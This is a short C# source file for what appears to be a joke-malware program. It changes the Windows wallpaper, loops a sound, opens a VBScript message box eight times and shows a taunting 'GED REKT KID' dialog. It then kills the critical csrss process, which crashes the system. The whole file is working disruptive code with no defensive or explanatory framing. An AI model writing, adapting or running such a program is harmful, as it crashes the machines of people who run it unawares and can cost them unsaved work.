using System.Media;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Security.Permissions;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;


class Program
{
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int SystemParametersInfo(int uAction,
            int uParam, string lpvParam, int fuWinIni);
        private static readonly int MAX_PATH = 260;
        private static readonly int SPI_GETDESKWALLPAPER = 0x73;
        private static readonly int SPI_SETDESKWALLPAPER = 0x14;
        private static readonly int SPIF_UPDATEINIFILE = 0x01;
        private static readonly int SPIF_SENDWININICHANGE = 0x02;
    static void Main()
    {
	Console.Title = "boi";
        // Create new SoundPlayer in the using statement.
        using (SoundPlayer player = new SoundPlayer("see.wav"))
        {
		SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, "wrong.bmp", SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
 		player.PlayLooping();
		System.Threading.Thread.Sleep(2500);
	ProcessStartInfo startInfo = new ProcessStartInfo();
	startInfo.FileName = "cscript";
	startInfo.Arguments = "msgbox1.vbs";
startInfo.RedirectStandardOutput = true;
startInfo.RedirectStandardError = true;
startInfo.UseShellExecute = false;
startInfo.CreateNoWindow = true;

Process processTemp = new Process();
processTemp.StartInfo = startInfo;
processTemp.EnableRaisingEvents = true;
		System.Threading.Thread.Sleep(2500);
		Process.Start("cscript.exe", "msgbox1.vbs");
		System.Threading.Thread.Sleep(2500);
		Process.Start("cscript.exe", "msgbox1.vbs");
		System.Threading.Thread.Sleep(2500);
		Process.Start("cscript.exe", "msgbox1.vbs");
		System.Threading.Thread.Sleep(2500);
		Process.Start("cscript.exe", "msgbox1.vbs");
		System.Threading.Thread.Sleep(2500);
		Process.Start("cscript.exe", "msgbox1.vbs");
		System.Threading.Thread.Sleep(2500);
		Process.Start("cscript.exe", "msgbox1.vbs");
		System.Threading.Thread.Sleep(2500);
		Process.Start("cscript.exe", "msgbox1.vbs");
		System.Threading.Thread.Sleep(2500);
		Process.Start("cscript.exe", "msgbox1.vbs");
            	SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, "protection.bmp", SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
		System.Threading.Thread.Sleep(5000);
		MessageBox.Show("WELL CRAP", "GED REKT KID", MessageBoxButtons.OK, MessageBoxIcon.Information);
		System.Diagnostics.Process.GetProcessesByName("csrss")[0].Kill();
        }
    }
}
